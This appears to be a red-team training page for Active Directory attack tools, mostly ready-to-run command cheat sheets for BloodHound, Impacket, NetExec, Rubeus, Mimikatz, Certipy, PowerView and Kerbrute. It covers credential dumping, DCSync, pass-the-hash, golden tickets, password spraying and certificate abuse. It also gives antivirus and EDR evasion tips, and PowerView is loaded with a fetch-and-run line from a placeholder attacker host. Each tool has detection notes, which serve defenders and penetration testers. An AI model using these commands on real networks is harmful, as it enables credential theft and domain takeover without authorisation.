@@ -1,0 +1,433 @@
+---
+layout: training-page
+title: "Active Directory Tools — Red Team Academy"
+module: "Red Team Tools"
+tags:
+  - active-directory
+  - kerberos
+  - ldap
+  - windows
+page_key: "tools-ad"
+---
+<h1>Active Directory &amp; Identity Tools</h1>
+  <p style="color:var(--text-muted); margin-bottom:28px;">
+    The core toolkit for attacking Windows Active Directory environments. These tools cover enumeration,
+    credential theft, Kerberos attacks, lateral movement, and certificate abuse.
+  </p>
+
+  <!-- BLOODHOUND -->
+  <h2 id="bloodhound">// BloodHound CE + SharpHound</h2>
+  <p style="color:var(--text-muted); font-size:13px;">BloodHound Community Edition visualizes AD relationships and attack paths using graph theory. SharpHound is the C# data collector (ingestor). BloodHound CE (2024+) uses Neo4j and provides a full REST API.</p>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Install BloodHound CE</h3>
+  <pre><code># Docker deployment (recommended)
+curl -L https://ghst.ly/getbhce | docker compose -f - up
+
+# Access UI at http://localhost:8080
+# Default: admin / (generated on first run — check docker logs)</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">SharpHound Collection</h3>
+  <pre><code># Full collection (requires domain user)
+.\SharpHound.exe -c All --zipfilename bloodhound.zip
+
+# Stealth: only LDAP-based collection (no net session enum)
+.\SharpHound.exe -c DCOnly,Trusts
+
+# Loop collection (persistent monitoring)
+.\SharpHound.exe -c All --Loop --LoopDuration 02:00:00 --LoopInterval 00:05:00
+
+# From Linux (Impacket-based)
+bloodhound-python -d domain.local -u user -p 'Pass123' -ns 192.168.1.10 -c All
+
+# Target specific OU
+.\SharpHound.exe -c All --SearchBase "OU=Users,DC=domain,DC=local"</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Key Cypher Queries</h3>
+  <pre><code>// All shortest paths to Domain Admins
+MATCH p=shortestPath((u:User)-[*1..]->(g:Group &#123;name:"DOMAIN ADMINS@DOMAIN.LOCAL"&#125;)) RETURN p
+
+// Users with DCSync rights
+MATCH (u)-[:GetChanges|GetChangesAll]->(d:Domain) RETURN u.name
+
+// Kerberoastable users with paths to DA
+MATCH (u:User &#123;hasspn:true&#125;)-[r*1..]->(g:Group &#123;name:"DOMAIN ADMINS@DOMAIN.LOCAL"&#125;) RETURN u.name
+
+// AS-REP Roastable accounts
+MATCH (u:User &#123;dontreqpreauth:true&#125;) RETURN u.name
+
+// Computers with unconstrained delegation
+MATCH (c:Computer &#123;unconstraineddelegation:true&#125;) RETURN c.name
+
+// High value targets
+MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.highvalue=true RETURN u.name,g.name</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Detections</h3>
+  <ul style="font-size:13px; color:var(--text-muted); line-height:1.8;">
+    <li>Event ID 4661: Large volume of LDAP queries against AD objects</li>
+    <li>Event ID 7045 / 4697: SharpHound creates a temporary service during collection</li>
+    <li>MDI (Microsoft Defender for Identity): Detects "Reconnaissance using LDAP enumeration" and "BloodHound reconnaissance"</li>
+    <li>Net session enumeration (Event 4624 + 4634) from many hosts in short time</li>
+    <li>SharpHound binary signature is flagged by most AVs — use custom build or obfuscated version</li>
+  </ul>
+  <p style="font-size:12px; color:var(--text-muted); border-left:2px solid var(--border-accent); padding-left:12px; margin-top:8px;">
+    <strong>OPSEC:</strong> Use -c DCOnly to avoid touching workstations. Run from a compromised domain-joined host rather than your attack box. Consider bloodhound-python for remote collection without binary drop.
+  </p>
+
+  <hr style="border:none; border-top:1px solid var(--border); margin:32px 0;" />
+
+  <!-- IMPACKET -->
+  <h2 id="impacket">// Impacket</h2>
+  <p style="color:var(--text-muted); font-size:13px;">Python collection of network protocol implementations for AD attacks. The most comprehensive AD attack framework — covers authentication, credential theft, lateral movement, and domain compromise.</p>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Install</h3>
+  <pre><code>pipx install impacket
+# or
+git clone https://github.com/fortra/impacket
+cd impacket && pip install .</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Key Tools &amp; Usage</h3>
+  <pre><code># secretsdump: Extract hashes from SAM, NTDS.dit, LSA secrets
+impacket-secretsdump domain/user:'Pass123'@192.168.1.10
+impacket-secretsdump -hashes :NTHASH domain/user@192.168.1.10   # PTH
+impacket-secretsdump -just-dc-ntlm domain/user:'Pass123'@DC01   # DCSync
+
+# psexec: Remote shell via SMB (creates service)
+impacket-psexec domain/user:'Pass123'@192.168.1.10
+
+# wmiexec: Remote exec via WMI (no service creation, semi-interactive)
+impacket-wmiexec domain/user:'Pass123'@192.168.1.10
+
+# smbexec: SMB exec (writes to TEMP, noisier)
+impacket-smbexec domain/user:'Pass123'@192.168.1.10
+
+# atexec: Execute via Task Scheduler
+impacket-atexec domain/user:'Pass123'@192.168.1.10 "whoami"
+
+# GetTGT: Request TGT (Kerberos auth)
+impacket-getTGT domain.local/user:'Pass123'
+export KRB5CCNAME=user.ccache
+
+# GetST: Request Service Ticket (for S4U2Self, S4U2Proxy)
+impacket-getST -spn cifs/TARGET.domain.local domain/user:'Pass123'
+impacket-getST -spn cifs/DC01.domain.local -impersonate Administrator domain/user:'Pass123'
+
+# GetNPUsers: AS-REP Roasting
+impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -format hashcat
+
+# GetUserSPNs: Kerberoasting
+impacket-GetUserSPNs domain.local/user:'Pass123' -request -outputfile spns.txt
+
+# ntlmrelayx: NTLM relay attacks
+impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami > /tmp/out.txt"
+impacket-ntlmrelayx -tf targets.txt -smb2support -socks  # SOCKS mode
+
+# rpcdump: Enumerate RPC endpoints
+impacket-rpcdump @192.168.1.10 | grep -i "ms-rprn\|EFSR"  # Coercion check</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Detections</h3>
+  <ul style="font-size:13px; color:var(--text-muted); line-height:1.8;">
+    <li>psexec: Event 7045 (service installation), Event 4697, creates PSEXESVC or random service name</li>
+    <li>wmiexec: Event 4648, WMI activity in WMI-Activity operational log, DCOM lateral movement pattern</li>
+    <li>secretsdump remote: Event 4662 (DCSync rights check), DRSUAPI calls detected by MDI</li>
+    <li>ntlmrelayx: Captured credentials visible in proxy logs; SMB signing must be disabled</li>
+    <li>Impacket tools have distinctive SMB dialects and Python UA strings detectable by NTA tools</li>
+  </ul>
+
+  <hr style="border:none; border-top:1px solid var(--border); margin:32px 0;" />
+
+  <!-- NETEXEC -->
+  <h2 id="netexec">// NetExec (nxc)</h2>
+  <p style="color:var(--text-muted); font-size:13px;">The maintained successor to CrackMapExec. Network authentication testing and lateral movement tool supporting SMB, WinRM, LDAP, MSSQL, SSH, FTP. Essential for credential validation and enumeration across large AD environments.</p>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Install</h3>
+  <pre><code>pipx install netexec
+# or
+sudo apt install netexec</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Common Usage</h3>
+  <pre><code># Credential validation across subnet
+nxc smb 192.168.1.0/24 -u user -p 'Pass123'
+nxc smb 192.168.1.0/24 -u user -H NTHASH         # PTH
+
+# Enumerate shares
+nxc smb 192.168.1.0/24 -u user -p 'Pass123' --shares
+
+# Remote code execution
+nxc smb 192.168.1.10 -u admin -p 'Pass123' -x "whoami" --exec-method smbexec
+nxc smb 192.168.1.10 -u admin -p 'Pass123' -X "Get-Process" --exec-method wmiexec
+
+# Dump SAM hashes (local admin required)
+nxc smb 192.168.1.10 -u admin -p 'Pass123' --sam
+
+# LSA secrets
+nxc smb 192.168.1.10 -u admin -p 'Pass123' --lsa
+
+# NTDS.dit (Domain Controller only)
+nxc smb DC01 -u domain_admin -p 'Pass123' --ntds
+
+# WinRM access
+nxc winrm 192.168.1.10 -u user -p 'Pass123' -x "whoami"
+
+# LDAP enumeration
+nxc ldap DC01 -u user -p 'Pass123' --users
+nxc ldap DC01 -u user -p 'Pass123' --groups
+nxc ldap DC01 -u user -p 'Pass123' --bloodhound -c All
+
+# Password spray (one password against many users)
+nxc smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success
+nxc smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --no-bruteforce  # safe spray
+
+# MSSQL
+nxc mssql 192.168.1.10 -u sa -p 'Sa123' -q "SELECT @@version"
+nxc mssql 192.168.1.10 -u sa -p 'Sa123' --local-auth -x "whoami" --xp-cmdshell</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Detections</h3>
+  <ul style="font-size:13px; color:var(--text-muted); line-height:1.8;">
+    <li>Password spray: Event 4625 (failed logon) spike, followed by 4624 (success) — correlate timing</li>
+    <li>MDI: "Password Spray Attack" alert when same password tried against multiple accounts</li>
+    <li>SMB lateral movement: Event 4648, 4624 Type 3, WMI events</li>
+    <li>NTDS dump: DRSUAPI/DCSync alerts from MDI, Event 4662</li>
+    <li>NetExec tool signature: distinctive SMB negotiation patterns similar to Impacket</li>
+  </ul>
+  <p style="font-size:12px; color:var(--text-muted); border-left:2px solid var(--border-accent); padding-left:12px; margin-top:8px;">
+    <strong>OPSEC:</strong> Spraying — stay below lockout threshold (usually 3-5 attempts). Wait 30+ minutes between spray rounds. Use --no-bruteforce flag. Target specific subnets rather than spraying entire range simultaneously.
+  </p>
+
+  <hr style="border:none; border-top:1px solid var(--border); margin:32px 0;" />
+
+  <!-- RUBEUS -->
+  <h2 id="rubeus">// Rubeus</h2>
+  <p style="color:var(--text-muted); font-size:13px;">C# Kerberos attack toolkit. Covers every major Kerberos attack — AS-REP roasting, Kerberoasting, ticket forging, delegation attacks, and ticket extraction. Runs in-memory without touching LSASS.</p>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Common Usage</h3>
+  <pre><code># Kerberoasting (request service tickets for offline cracking)
+Rubeus.exe kerberoast /outfile:spns.txt /format:hashcat
+
+# Kerberoast a specific user
+Rubeus.exe kerberoast /user:svc_sql /format:hashcat
+
+# AS-REP Roasting (accounts without pre-auth)
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# Dump all tickets from current session
+Rubeus.exe dump /nowrap
+
+# Extract ticket for specific service
+Rubeus.exe dump /service:krbtgt /nowrap
+
+# Pass-the-Ticket: inject harvested TGT
+Rubeus.exe ptt /ticket:base64encodedticket==
+
+# Overpass-the-Hash: convert NTLM hash to Kerberos TGT
+Rubeus.exe asktgt /user:admin /rc4:NTHASH /domain:domain.local /ptt
+
+# Request TGT with AES key (less noisy than RC4)
+Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local /opsec /ptt
+
+# S4U2Self + S4U2Proxy (constrained delegation abuse)
+Rubeus.exe s4u /user:svc_iis /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/DC01 /ptt
+
+# Unconstrained delegation ticket monitoring
+Rubeus.exe monitor /interval:5 /filteruser:DC01$
+
+# Golden ticket (requires krbtgt hash)
+Rubeus.exe golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /rc4:KRBTGT_HASH /ptt
+
+# Silver ticket (service-specific)
+Rubeus.exe silver /service:cifs/TARGET /user:Administrator /domain:domain.local /rc4:MACHINE_HASH /ptt</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Detections</h3>
+  <ul style="font-size:13px; color:var(--text-muted); line-height:1.8;">
+    <li>Kerberoasting: Event 4769 (service ticket request) with RC4 encryption type — RC4 is legacy and suspicious for modern DCs</li>
+    <li>AS-REP Roasting: Event 4768 with Pre-Authentication Type 0x0</li>
+    <li>Golden Ticket: ticket with lifetime &gt; 10 hours, wrong SID, or from non-existent DC</li>
+    <li>Overpass-the-Hash: Event 4768 from non-DC machine (clients requesting TGTs directly)</li>
+    <li>MDI: "Malicious replication of directory services" alert for DCSync; Kerberos-specific anomaly detection</li>
+    <li>Rubeus binary itself has high AV detection rate — use custom compiled/obfuscated build</li>
+  </ul>
+
+  <hr style="border:none; border-top:1px solid var(--border); margin:32px 0;" />
+
+  <!-- MIMIKATZ -->
+  <h2 id="mimikatz">// Mimikatz</h2>
+  <p style="color:var(--text-muted); font-size:13px;">The definitive Windows credential extraction tool. Extracts plaintext passwords, hashes, PINs, and Kerberos tickets from Windows memory (LSASS), Active Directory, and other sources.</p>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Common Usage</h3>
+  <pre><code># Dump credentials from LSASS (requires local admin)
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
+# Dump NTLM hashes from LSASS
+mimikatz # sekurlsa::msv
+
+# Dump Kerberos tickets
+mimikatz # sekurlsa::tickets /export
+mimikatz # kerberos::list /export
+
+# DCSync: request credential replication from DC
+mimikatz # lsadump::dcsync /user:krbtgt /domain:domain.local
+mimikatz # lsadump::dcsync /all /csv
+
+# SAM database dump (local)
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+
+# LSA secrets
+mimikatz # lsadump::secrets
+
+# Pass-the-Hash
+mimikatz # sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH /run:powershell
+
+# Golden Ticket
+mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:SID /krbtgt:HASH /ptt
+
+# DPAPI: Decrypt Chrome passwords, credential blobs
+mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+
+# Patch Credential Guard (Win10+)
+mimikatz # misc::memssp  # adds SSP to intercept future logons</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Alternatives (EDR evasion)</h3>
+  <pre><code># NanoDump: minidump LSASS without opening LSASS process handle directly
+nanodump --write /tmp/lsass.dmp --valid
+# Parse offline with pypykatz:
+pypykatz lsa minidump lsass.dmp
+
+# HandleKatz: uses duplicate handle technique to avoid LSASS open
+HandleKatz.exe --pid LSASS_PID --outfile dump.dmp
+
+# SilentProcessExit: trigger Windows error reporting to dump LSASS
+# RunAsPPL bypass: BYOVD techniques (vulnerable driver loading)</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Detections</h3>
+  <ul style="font-size:13px; color:var(--text-muted); line-height:1.8;">
+    <li>EDR: LSASS process memory access (GrantedAccess 0x1010, 0x1410, 0x1438) — flagged by virtually all EDRs</li>
+    <li>Event 10 (Sysmon): LSASS process access</li>
+    <li>Windows Credential Guard: prevents credential extraction from LSASS on modern systems</li>
+    <li>PPL (Protected Process Light): LSASS runs protected; drivers needed to bypass</li>
+    <li>Mimikatz binary: extremely high AV detection — always use in-memory (invoke-mimikatz, execute-assembly)</li>
+  </ul>
+
+  <hr style="border:none; border-top:1px solid var(--border); margin:32px 0;" />
+
+  <!-- CERTIPY -->
+  <h2 id="certipy">// Certipy</h2>
+  <p style="color:var(--text-muted); font-size:13px;">Python tool for Active Directory Certificate Services (ADCS) attacks. Enumerates vulnerable certificate templates (ESC1-ESC13) and exploits them to obtain certificates for domain escalation or persistence.</p>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Install</h3>
+  <pre><code>pipx install certipy-ad</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Common Usage</h3>
+  <pre><code># Enumerate ADCS — find vulnerable templates
+certipy find -u user@domain.local -p 'Pass123' -dc-ip 192.168.1.10
+
+# Find only vulnerable templates
+certipy find -u user@domain.local -p 'Pass123' -vulnerable -stdout
+
+# ESC1: Request cert for another user (misconfigured template)
+certipy req -u user@domain.local -p 'Pass123' -ca DOMAIN-CA -template VulnTemplate -upn administrator@domain.local
+
+# ESC4: Write access to template — modify and exploit
+certipy template -u user@domain.local -p 'Pass123' -template VulnTemplate -save-old
+certipy req -u user@domain.local -p 'Pass123' -ca DOMAIN-CA -template VulnTemplate -upn administrator@domain.local
+
+# ESC8: NTLM relay to ADCS web enrollment
+certipy relay -target http://CA-SERVER/certsrv/certfnsh.asp -template Machine
+
+# Authenticate with certificate to get NTLM hash
+certipy auth -pfx administrator.pfx -domain domain.local
+
+# PKINIT: get TGT using certificate
+certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Detections</h3>
+  <ul style="font-size:13px; color:var(--text-muted); line-height:1.8;">
+    <li>Event 4886: Certificate enrollment request with unusual SAN (Subject Alternative Name)</li>
+    <li>Event 4887: Certificate issued with UPN not matching the requesting user</li>
+    <li>MDI: "Suspicious certificate usage" alert for PKINIT auth anomalies</li>
+    <li>ADCS audit logs: enable "Certificate Services" auditing — Event 4886/4887/4888</li>
+  </ul>
+
+  <hr style="border:none; border-top:1px solid var(--border); margin:32px 0;" />
+
+  <!-- POWERVIEW -->
+  <h2 id="powerview">// PowerView</h2>
+  <p style="color:var(--text-muted); font-size:13px;">PowerShell module for AD enumeration. Part of PowerSploit. Uses .NET ADSI/DirectoryServices — no external binaries required. Best for stealthy enumeration when execution policy allows PowerShell.</p>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Common Usage</h3>
+  <pre><code># Import (in-memory, AMSI bypass first)
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerView.ps1')
+
+# Domain info
+Get-NetDomain
+Get-NetDomainController
+Get-NetForest
+
+# User enumeration
+Get-NetUser | select samaccountname,description,memberof
+Get-NetUser -SPN  # Kerberoastable accounts
+Get-NetUser -PreauthNotRequired  # AS-REP roastable
+
+# Group enumeration
+Get-NetGroup "Domain Admins" | select member
+Get-NetLocalGroupMember -ComputerName WORKSTATION01
+
+# GPO enumeration
+Get-NetGPO | select displayname,gpcfilesyspath
+Get-NetGPOGroup  # Find GPOs that grant local admin
+
+# ACL/ACE enumeration
+Get-ObjectAcl -SamAccountName "svc_sql" -ResolveGUIDs
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object &#123;$_.IdentityReference -like "*Domain Users*"&#125;
+
+# Session enumeration (find logged in users)
+Get-NetSession -ComputerName DC01
+Find-DomainUserLocation -UserName Administrator  # Find where DA is logged in
+
+# Share enumeration
+Find-DomainShare -CheckShareAccess  # Find readable shares
+Find-InterestingDomainShareFile  # Grep for sensitive files in shares
+
+# Trust enumeration
+Get-NetDomainTrust
+Get-NetForestTrust</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Detections</h3>
+  <ul style="font-size:13px; color:var(--text-muted); line-height:1.8;">
+    <li>LDAP enumeration generates Event 4661 (object access) — volume indicates scanning</li>
+    <li>Get-NetSession: accesses SRVSVC pipe on remote hosts (Event 4624 Type 3)</li>
+    <li>PowerShell Script Block Logging (Event 4104): captures PowerView function names</li>
+    <li>AMSI: PowerView script content is flagged — load via AMSI bypass or use obfuscated version</li>
+    <li>MDI: "Domain controller LDAP query with excessive frequency"</li>
+  </ul>
+
+  <hr style="border:none; border-top:1px solid var(--border); margin:32px 0;" />
+
+  <!-- KERBRUTE -->
+  <h2 id="kerbrute">// Kerbrute</h2>
+  <p style="color:var(--text-muted); font-size:13px;">Fast Go-based tool for Kerberos user enumeration and brute-force. Performs AS-REQ requests to validate usernames without triggering lockouts (user enum doesn't cause failed auth). Also supports password spraying.</p>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Install</h3>
+  <pre><code>go install github.com/ropnop/kerbrute@latest
+# or download binary from releases</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Common Usage</h3>
+  <pre><code># User enumeration (does NOT cause lockout)
+kerbrute userenum --dc 192.168.1.10 -d domain.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# Password spray (one password, many users — watch lockout policy)
+kerbrute passwordspray --dc 192.168.1.10 -d domain.local users.txt 'Password123!'
+
+# Brute force single account
+kerbrute bruteuser --dc 192.168.1.10 -d domain.local passwords.txt svc_sql
+
+# Output valid users
+kerbrute userenum --dc 192.168.1.10 -d domain.local users.txt -o valid-users.txt</code></pre>
+
+  <h3 style="font-size:13px; color:var(--cyan-dim); margin:16px 0 8px;">Detections</h3>
+  <ul style="font-size:13px; color:var(--text-muted); line-height:1.8;">
+    <li>User enum: Event 4768 with error code 0x6 (KDC_ERR_C_PRINCIPAL_UNKNOWN) — normal but volumes are suspicious</li>
+    <li>Password spray: Event 4771 (pre-auth failed) spike — MDI detects this pattern</li>
+    <li>MDI: "Brute force attack using Kerberos" alert</li>
+    <li>Kerberos pre-auth requests from non-domain hosts are anomalous</li>
+  </ul>
